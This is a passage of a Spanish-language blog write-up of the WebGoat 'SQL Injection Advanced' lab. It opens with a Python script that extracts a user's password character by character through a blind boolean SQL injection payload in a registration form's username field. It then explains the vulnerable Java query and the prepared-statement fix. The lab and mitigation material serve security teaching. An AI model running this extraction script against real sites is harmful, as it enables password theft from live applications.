<span class="n">peticion</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">Session</span><span class="p">()</span>
<span class="n">peticion</span><span class="p">.</span><span class="n">headers</span><span class="p">.</span><span class="n">update</span><span class="p">({</span>
    <span class="s">"Cookie"</span><span class="p">:</span> <span class="n">cookie</span>
<span class="p">})</span>

<span class="k">def</span> <span class="nf">visibilidad</span><span class="p">(</span><span class="n">req</span><span class="p">):</span>
    <span class="n">tmp</span> <span class="o">=</span> <span class="n">req</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
    <span class="k">if</span><span class="p">(</span><span class="n">tmp</span><span class="p">.</span><span class="n">status_code</span> <span class="o">!=</span> <span class="mi">200</span><span class="p">):</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"[-] No hay visibilidad con el objetivo."</span><span class="p">)</span>
        <span class="nb">exit</span><span class="p">()</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"[+] Hay visibilidad! ;)"</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">verf_resultado</span><span class="p">(</span><span class="n">respuesta</span><span class="p">):</span>
    <span class="k">if</span><span class="p">(</span><span class="s">"already exists please try"</span> <span class="ow">in</span> <span class="n">respuesta</span><span class="p">[</span><span class="s">"feedback"</span><span class="p">]):</span>
        <span class="k">return</span> <span class="bp">True</span>
    <span class="k">elif</span><span class="p">(</span><span class="s">"Sorry the solution is not correct, please try again"</span> <span class="ow">in</span> <span class="n">respuesta</span><span class="p">[</span><span class="s">"feedback"</span><span class="p">]):</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"[+] Proceso terminado"</span><span class="p">)</span>
        <span class="nb">exit</span><span class="p">()</span>
    <span class="k">return</span> <span class="bp">False</span>

<span class="k">def</span> <span class="nf">request_vuln</span><span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">payload</span><span class="p">):</span>
    <span class="n">contenido</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s">"username_reg"</span><span class="p">:</span> <span class="n">payload</span><span class="p">,</span>
        <span class="s">"email_reg"</span><span class="p">:</span> <span class="s">"test@test.com"</span><span class="p">,</span>
        <span class="s">"password_reg"</span><span class="p">:</span> <span class="s">"123456"</span><span class="p">,</span>
        <span class="s">"confirm_password_reg"</span><span class="p">:</span><span class="s">"123456"</span>
    <span class="p">}</span>
    
    <span class="n">exploit</span> <span class="o">=</span> <span class="n">req</span><span class="p">.</span><span class="n">put</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">contenido</span><span class="p">)</span>
    <span class="n">respuesta</span> <span class="o">=</span> <span class="n">exploit</span><span class="p">.</span><span class="n">json</span><span class="p">()</span>
    
    <span class="k">return</span> <span class="n">verf_resultado</span><span class="p">(</span><span class="n">respuesta</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">run</span><span class="p">():</span>
    <span class="n">abc</span> <span class="o">=</span> <span class="s">"abcdefghijklmnopqrstuvxyz"</span>
    <span class="n">solucion</span> <span class="o">=</span> <span class="s">""</span>
    <span class="n">limit</span> <span class="o">=</span> <span class="mi">30</span>
    
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">limit</span><span class="p">):</span>
        <span class="k">for</span> <span class="n">letra</span> <span class="ow">in</span> <span class="n">abc</span><span class="p">:</span>
            <span class="n">payload</span> <span class="o">=</span> <span class="s">"tom</span><span class="se">\'</span><span class="s"> AND substring(password,{},1)=</span><span class="se">\'</span><span class="s">{}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">letra</span><span class="p">)</span>
            <span class="k">if</span><span class="p">(</span><span class="n">request_vuln</span><span class="p">(</span><span class="n">peticion</span><span class="p">,</span> <span class="n">payload</span><span class="p">)):</span>
                <span class="n">solucion</span> <span class="o">+=</span> <span class="n">letra</span>
                <span class="k">print</span><span class="p">(</span><span class="n">solucion</span><span class="p">)</span>
    
<span class="n">run</span><span class="p">()</span>
</pre></table></code></div></div><h4 id="mitigación">Mitigación</h4><p>En el proceso de mitigación de esta vulnerabilidad, ocurre algo muy curioso, por que se tienen 2 consultas a la base de datos, pero solo que una es vulnerable y la otra esta desarrollada de forma segura.</p><ol><li>La primera consulta si el usuario a registrar ya existe o no.<li>La segunda inserta los datos en la base de datos y crea el nuevo usuario.<ul><li><code class="language-plaintext highlighter-rouge">\webgoat-lessons\sql-injection\src\main\java\org\owasp\webgoat\sql_injection\advanced\SqlInjectionChallenge.java</code></ul></ol><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/webgoat/A1/1_sql_injection/10_codigo_vulnerabilidad.png" alt="Código Vulnerabilidad" /> <em>Código Vulnerabilidad</em></p><p>Cómo se puede observar, la sección enmarcada en amarillo corresponde a vulnerabilidad que se da e una consulta a base de datos, debido a que esta concatena de forma directa el parametro <code class="language-plaintext highlighter-rouge">username_reg</code> el cual es controlado por el usuario.</p><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nc">String</span> <span class="n">checkUserQuery</span> <span class="o">=</span> <span class="s">"select userid from sql_challenge_users where userid = '"</span> <span class="o">+</span> <span class="n">username_reg</span> <span class="o">+</span> <span class="s">"'"</span><span class="o">;</span>
</pre></table></code></div></div><p>De lo anterior le damos sentido al por qué la forma de nuestro <strong>payload</strong>, y el cómo al concatenar una entrada como <code class="language-plaintext highlighter-rouge">tom\' AND substring(password,1,1)=\'a</code> alteramos el sentido de la consulta:</p><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nc">String</span> <span class="n">checkUserQuery</span> <span class="o">=</span> <span class="s">"select userid from sql_challenge_users where userid = 'tom' AND substring(password,1,1)='a'"</span><span class="o">;</span>
</pre></table></code></div></div><p>Sin embargo, la <strong>query</strong> enmarcada en verde es la que realiza la acción del registro del usuario en base de datos; pero esta <strong>query</strong> NO es vulnerable aunque reciba parametros del cliente, debido a que hace uso de <strong>consultas preparadas</strong>:</p><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="nc">PreparedStatement</span> <span class="n">preparedStatement</span> <span class="o">=</span> <span class="n">connection</span><span class="o">.</span><span class="na">prepareStatement</span><span class="o">(</span><span class="s">"INSERT INTO sql_challenge_users VALUES (?, ?, ?)"</span><span class="o">);</span>
<span class="n">preparedStatement</span><span class="o">.</span><span class="na">setString</span><span class="o">(</span><span class="mi">1</span><span class="o">,</span> <span class="n">username_reg</span><span class="o">);</span>
<span class="n">preparedStatement</span><span class="o">.</span><span class="na">setString</span><span class="o">(</span><span class="mi">2</span><span class="o">,</span> <span class="n">email_reg</span><span class="o">);</span>
<span class="n">preparedStatement</span><span class="o">.</span><span class="na">setString</span><span class="o">(</span><span class="mi">3</span><span class="o">,</span> <span class="n">password_reg</span><span class="o">);</span>
<span class="n">preparedStatement</span><span class="o">.</span><span class="na">execute</span><span class="o">();</span>
</pre></table></code></div></div><p>Esta forma es adecuada para evitar vulnerabilidades de tipo <strong>SQL Injection</strong>, debido a que inicialmente construimos la consulta y le indicamos con <code class="language-plaintext highlighter-rouge">?</code> dónde irán los parametros dinamicos (muy similar a un <code class="language-plaintext highlighter-rouge">.format()</code> de python); así pues, posteriormente se le señala durante la consutrcción de toda la consulta, qué dato forma parte de la lógica y cuál corresponde a contenido estatico, evitando que si alguien inyecta un comando SQL, este se no interprete.</p><p>Otras mitigaciones:</p><ul><li>Utilizar procesos almacenados.<li>Sanitizar el contenido de los parametros dinamicos antes de inyectarlos a una consulta.<li>Utilización de un ORM<ul><li>Java: Hibernate<li>C#: Entity framework<li>Python: Django</ul></ul><h2 id="referencias">Referencias</h2><ol><li><a href="https://www.websec.ca/kb/sql_injection">SQL Injection Knowledge Base</a><li><a href="https://www.tarlogic.com/en/blog/red-team-tales-0x01/">Explotar el XP_CMDSHELL</a><li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html">Query Parameterization - Cheat Sheet</a></ol></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/webgoat/'>WebGoat</a>, <a href='/categories/a1/'>A1</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/sql-injection/" class="post-tag no-text-decoration" >SQL-injection</a> <a href="/tags/blind-sql/" class="post-tag no-text-decoration" >blind-sql</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Compartir</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=WebGoat - A1 - SQL Injection Advanced - CSL&url=https://csl-labs.github.io/posts/webgoat-a1-sql-injection/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=WebGoat - A1 - SQL Injection Advanced - CSL&u=https://csl-labs.github.io/posts/webgoat-a1-sql-injection/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=WebGoat - A1 - SQL Injection Advanced - CSL&url=https://csl-labs.github.io/posts/webgoat-a1-sql-injection/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Actualizada Recientemente</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/htb-nest/">HTB-NEST</a><li><a href="/posts/htb-openadmin/">HTB-OPENADMIN</a><li><a href="/posts/htb-sauna/">HTB-SAUNA</a></ul></div><div id="access-tags"> <span>Tags Relevantes</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">HTB</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/ad/">AD</a> <a class="post-tag" href="/tags/blind-sql/">blind sql</a> <a class="post-tag" href="/tags/cracking/">cracking</a> <a class="post-tag" href="/tags/decompiling/">decompiling</a> <a class="post-tag" href="/tags/journalctl/">journalctl</a> <a class="post-tag" href="/tags/kerberos/">kerberos</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/nodejs/">NodeJS</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Tabla de Contenido</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Otras Publicaciones</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/webgoat-a1-path-traversal/"><div class="card-body"> <span class="timeago small" > Jan 7 <i class="unloaded">2021-01-07T14:10:00-05:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>WebGoat - A1 - Path Traversal</h3><div class="text-muted small"><p> Introducción De forma breve, como lo indica la descripción de la vulnerabilidad el Path Traversal nos permite crear, leer, editar o eliminar archivos fuera la ubicación definida por el aplicativo; ...</p></div></div></a></div><div class="card"> <a href="/posts/webgoat-a7-xss/"><div class="card-body"> <span class="timeago small" > Mar 1 <i class="unloaded">2021-03-01T14:10:00-05:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>WebGoat - A7 - (XSS) Cross Site Scripting</h3><div class="text-muted small"><p> Introducción En esta ocasión vamos a trabajar con un laboratorio de Cross Site Scripting (XSS), en el que nos aprovecharemos de distintas funcionalidades que no realizan un correcto saneamiento de ...</p></div></div></a></div><div class="card"> <a href="/posts/htb-nest/"><div class="card-body"> <span class="timeago small" > Nov 26, 2020 <i class="unloaded">2020-11-26T14:10:00-05:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HTB-NEST</h3><div class="text-muted small"><p> Decripción del entorno Atacante OS Kali Linux IP 10.10.14.199 Maquina Objetivo OS Windows IP 10.10....</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/webgoat-a7-xss/" class="btn btn-outline-primary"><p>WebGoat - A7 - (XSS) Cross Site Scripting</p></a> <span class="btn btn-outline-primary disabled"><p>-</p></span></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2021 <a href="https://twitter.com/CsLcol">CSL</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy/" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Tags Relevantes</h4><a class="post-tag" href="/tags/htb/">HTB</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/ad/">AD</a> <a class="post-tag" href="/tags/blind-sql/">blind sql</a> <a class="post-tag" href="/tags/cracking/">cracking</a> <a class="post-tag" href="/tags/decompiling/">decompiling</a> <a class="post-tag" href="/tags/journalctl/">journalctl</a> <a class="post-tag" href="/tags/kerberos/">kerberos</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/nodejs/">NodeJS</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://csl-labs.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script> <script async src="https://www.googletagmanager.com/gtag/js?id="></script> <script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); </script>
